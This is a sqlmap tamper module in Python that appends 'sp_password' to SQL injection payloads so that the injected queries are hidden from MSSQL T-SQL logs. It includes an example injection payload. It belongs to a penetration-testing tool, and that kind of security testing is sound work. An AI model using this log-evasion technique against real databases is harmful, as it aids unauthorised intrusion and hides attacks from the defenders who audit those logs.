#!/usr/bin/env python

"""
Copyright (c) 2006-2012 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGH

def tamper(payload, **kwargs):
    """
    Appends 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs

    Example:
        * Input: 1 AND 9227=9227--
        * Output: 1 AND 9227=9227--sp_password

    Requirement:
        * MSSQL

    Notes:
        * Appending sp_password to the end of the query will hide it from T-SQL logs as a security measure
        * Reference: http://websec.ca/kb/sql_injection
    """

    retVal = ""

    if payload:
        retVal = "%s%ssp_password" % (payload, "-- " if not any(_ if _ in payload else None for _ in ('#', "-- ")) else "")

    return retVal
